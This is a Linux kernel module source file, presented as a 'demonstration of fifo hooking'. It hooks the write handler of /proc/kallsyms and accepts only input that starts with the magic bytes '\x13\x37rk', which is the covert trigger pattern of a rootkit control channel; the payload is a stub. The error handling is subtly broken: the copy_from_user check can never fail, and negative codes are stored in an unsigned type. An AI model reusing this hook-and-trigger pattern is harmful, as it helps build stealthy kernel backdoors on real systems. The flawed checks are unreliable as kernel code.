#include <linux/module.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "hook.h"

static void *old_write_kallsyms;

ssize_t
sample_hook (struct file *f, const char *user,
             size_t size, loff_t offset)
{
  size_t ret;
  char *buf;

  if (size < 4)
    {
      return -EIO;
    }

  buf = kmalloc (size, GFP_KERNEL);

  if (NULL == buf)
    {
      return -EIO; /*-ENOMEM;*/
    }

  if (0 > copy_from_user (buf, user, size))
    {
      ret = -EIO;
      goto end;
    }

  if (0 != memcmp (buf, "\x13\x37rk", 4))
    {
      ret = -EIO;
      goto end;
    }

  /* stuff */

  ret = size;
 end:
  kfree (buf);
  return ret;
}

static int __init
module_entry (void)
{
  old_write_kallsyms = HOOK_PROC ("/proc/kallsyms", write, sample_hook);

  return 0;
}

static void __exit
module_out (void)
{
  UNHOOK_PROC ("/proc/kallsyms", write, old_write_kallsyms);
}

module_init(module_entry);
module_exit(module_out);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("malcult");
MODULE_DESCRIPTION("Demonstration of fifo hooking");
